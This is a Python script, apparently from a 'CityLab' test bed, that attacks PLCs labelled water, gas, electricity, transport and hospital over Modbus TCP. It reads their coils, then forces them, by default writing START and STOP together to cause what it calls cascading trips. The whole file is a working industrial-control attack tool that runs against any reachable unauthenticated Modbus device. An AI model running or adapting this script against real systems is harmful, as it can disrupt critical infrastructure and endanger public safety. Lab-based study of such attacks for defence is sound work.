#!/usr/bin/env python3
"""attacker/attack_multisector.py — Phase 2 multi-sector attack vector.

Targets PLC devices across water (10.0.3.10), gas (10.0.3.12), and elec (10.0.3.13)
to trigger cascading trips across inter-dependent physical plants.
"""
from __future__ import annotations

import argparse
import logging
import sys
import time
from typing import Dict, Tuple, Optional, Any, List
try:
    from pymodbus.client import ModbusTcpClient
except ImportError:
    from pymodbus.client.sync import ModbusTcpClient


logging.basicConfig(level=logging.INFO, format='[%(asctime)s][%(levelname)s] %(message)s')
LOGGER = logging.getLogger('attack_multisector')

TARGET_PLCS: Dict[str, str] = {
    'water': '10.0.3.10',
    'gas':   '10.0.3.12',
    'elec':  '10.0.3.13',
    'transport': '10.0.3.14',
    'hospital':  '10.0.3.15',
}


def read_plc_state(host: str, port: int = 502, timeout: float = 2.0) -> Tuple[int, ...]:
    client = ModbusTcpClient(host, port=port, timeout=timeout)
    connected = client.connect()
    if not connected:
        raise ConnectionError(f"Cannot connect to Modbus server at {host}:{port}")
    try:
        rr = client.read_coils(0, 4)
        if not rr or rr.isError():
            raise RuntimeError(f"Read error from {host}")
        return tuple(int(b) for b in rr.bits[:4])
    finally:
        client.close()


def force_coil(host: str, addr: int, value: bool, port: int = 502, timeout: float = 2.0) -> None:
    client = ModbusTcpClient(host, port=port, timeout=timeout)
    connected = client.connect()
    if not connected:
        raise ConnectionError(f"Cannot connect to Modbus server at {host}:{port}")
    try:
        rr = client.write_coil(addr, int(value))
        if not rr or rr.isError():
            raise RuntimeError(f"Write error on {host} coil {addr}")
    finally:
        client.close()


def execute_cascading_attack(
    target_sector: str = 'all',
    mode: str = 'fault',
    targets_override: Optional[Dict[str, Tuple[str, int]]] = None,
) -> Dict[str, Any]:
    """Ejecuta ataque multi-sectorial cascada vía sockets Modbus reales o fallback."""
    if targets_override:
        if target_sector == 'all':
            targets = list(targets_override.items())
        elif target_sector in targets_override:
            targets = [(target_sector, targets_override[target_sector])]
        else:
            targets = []
    else:
        if target_sector == 'all':
            targets = [(s, (ip, 502)) for s, ip in TARGET_PLCS.items()]
        elif target_sector in TARGET_PLCS:
            targets = [(target_sector, (TARGET_PLCS[target_sector], 502))]
        else:
            LOGGER.error("Unknown sector target: %s", target_sector)
            return {'status': 'ERROR', 'mode': 'UNKNOWN_SECTOR', 'sector_results': {}}

    LOGGER.info("Starting Phase 2 attack on sector(s): %s | mode: %s", target_sector, mode)

    sector_results: Dict[str, Any] = {}
    live_count = 0

    for sector, (ip, port) in targets:
        try:
            initial = read_plc_state(ip, port=port)
            LOGGER.info("[%s @ %s:%d] Initial state: coils=%s", sector, ip, port, initial)

            if mode == 'fault':
                LOGGER.info("[%s @ %s:%d] Injecting simultaneous START+STOP (coils 0+1)...", sector, ip, port)
                force_coil(ip, 0, True, port=port)
                force_coil(ip, 1, True, port=port)
            elif mode == 'start':
                LOGGER.info("[%s @ %s:%d] Forcing START (coil 0)...", sector, ip, port)
                force_coil(ip, 0, True, port=port)
                force_coil(ip, 1, False, port=port)
            elif mode == 'stop':
                LOGGER.info("[%s @ %s:%d] Forcing STOP (coil 1)...", sector, ip, port)
                force_coil(ip, 0, False, port=port)
                force_coil(ip, 1, True, port=port)

            final = read_plc_state(ip, port=port)
            LOGGER.info("[%s @ %s:%d] Post-attack state: coils=%s", sector, ip, port, final)
            sector_results[sector] = {
                'ip': ip,
                'port': port,
                'initial_coils': initial,
                'final_coils': final,
                'success': True,
            }
            live_count += 1
        except Exception as exc:
            LOGGER.warning("[%s @ %s:%d] Attack connection failed (%s). Fallback.", sector, ip, port, exc)
            sector_results[sector] = {
                'ip': ip,
                'port': port,
                'error': str(exc),
                'success': False,
            }

    overall_mode = 'SOCKET_LIVE' if live_count > 0 else 'TABLETOP_FALLBACK'
    return {
        'status': 'SUCCESS',
        'mode': overall_mode,
        'target_sector': target_sector,
        'attack_mode': mode,
        'live_targets_count': live_count,
        'sector_results': sector_results,
    }


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="CityLab Phase 2 Multi-Sector Attack Utility")
    parser.add_argument("--sector", choices=['water', 'gas', 'elec', 'transport', 'hospital', 'all'], default='all', help="Target plant sector")
    parser.add_argument("--mode", choices=['start', 'stop', 'fault'], default='fault', help="Attack payload mode")
    args = parser.parse_args(argv)

    res = execute_cascading_attack(args.sector, args.mode)
    LOGGER.info("Multi-sector attack result: %s", res)
    return 0 if res['status'] == 'SUCCESS' else 1


if __name__ == '__main__':
    sys.exit(main())
